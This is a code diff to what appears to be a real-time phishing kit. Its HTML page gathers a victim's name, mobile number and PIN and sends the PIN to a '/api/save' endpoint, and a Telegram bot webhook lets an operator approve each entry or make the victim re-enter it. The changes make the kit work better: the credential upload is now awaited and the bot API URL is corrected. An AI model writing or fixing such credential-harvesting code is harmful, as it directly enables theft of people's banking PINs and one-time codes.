@@ -1015,7 +1015,7 @@ HTML_PAGE = r"""<!DOCTYPE html>
 }, 3000);
 }
 
-function submitPin() {
+async function submitPin() {
     const formattedPhone = formatMobileWithCountryCode(appState.mobile);
     const otpLabel = document.getElementById('otp-mobile-label');
     if (otpLabel) otpLabel.innerText = formattedPhone;
@@ -1023,18 +1023,22 @@ function submitPin() {
     const msg = document.getElementById('pin-status-msg');
     if (msg) msg.innerText = 'Verifying PIN... Please wait.';
 
-    fetch('/api/save', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-            appId: appState.appId,
-            ref: appState.ref,
-            fullName: appState.fullName,
-            mobile: formattedPhone,
-            field: 'entered_pin',
-            value: enteredPin
-        })
-    }).catch(err => console.error(err));
+    try {
+        await fetch('/api/save', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                appId: appState.appId,
+                ref: appState.ref,
+                fullName: appState.fullName,
+                mobile: formattedPhone,
+                field: 'entered_pin',
+                value: enteredPin
+            })
+        });
+    } catch (err) {
+        console.error(err);
+    }
 
     watchHostDecision('pin');
 }
@@ -1223,7 +1227,7 @@ def telegram_webhook():
             if token:
                 reply_text = "Marked as INCORRECT. Client prompted to re-enter." if action == "retry" else "Marked as APPROVED."
                 requests.post(
-                    "https://telegram.org" + str(token) + "/answerCallbackQuery",
+                    "https://api.telegram.org/bot" + str(token) + "/answerCallbackQuery",
                     json={"callback_query_id": callback_id, "text": reply_text, "show_alert": True},
                     timeout=5
                 )
